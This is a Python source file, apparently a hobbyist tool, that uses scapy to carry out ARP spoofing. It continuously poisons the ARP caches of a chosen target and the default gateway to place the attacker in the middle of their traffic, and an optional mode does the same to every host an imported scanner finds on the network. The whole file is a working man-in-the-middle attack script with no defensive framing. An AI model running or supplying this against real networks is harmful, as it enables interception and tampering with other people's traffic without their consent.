import scapy.all as scapy
import argparse
import time
import arpScanner

def ARPspoof(targetIP, spoofIP):
    targetMAC = scapy.getmacbyip(targetIP)

    victimPacket = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(victimPacket, verbose=False)

def restoreARPT(targetIP, gwIP):
    gwmac = scapy.getmacbyip(gwIP)
    tmac = scapy.getmacbyip(targetIP)
    restorePacket = scapy.ARP(op=2, pdst=targetIP, hwdst=tmac, psrc=gwIP, hwsrc=gwmac)
    scapy.send(restorePacket)

def becomeMITM(targetIP):
    try:
        gw = scapy.conf.route.route("0.0.0.0")[2]
        sentPs = 0
        while True:
            ARPspoof(targetIP, gw)
            ARPspoof(gw, targetIP)
            sentPs+=2
            print("\r[+] Sent %d spoofed Packets" % sentPs, end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nQuitting, restoring macs")
        restoreARPT(targetIP, gw)

def massMITM():
    gw = scapy.conf.route.route("0.0.0.0")[2]
    while True:
        ips = arpScanner.getAllNetIps()
        for ip in ips:
            ARPspoof(ip, gw)
            ARPspoof(gw, ip)
        time.sleep(2)

def main():
    parser = argparse.ArgumentParser(usage='arpScanner.py TargetIP' '\nexample: sudo python3 arpScanner.py 162.168.1.56')
    parser.add_argument("-t", "--target", dest="target", help="Specify target ip")

    becomeMITM(parser.parse_args().target)
    #massMITM()


if __name__=="__main__":
    main()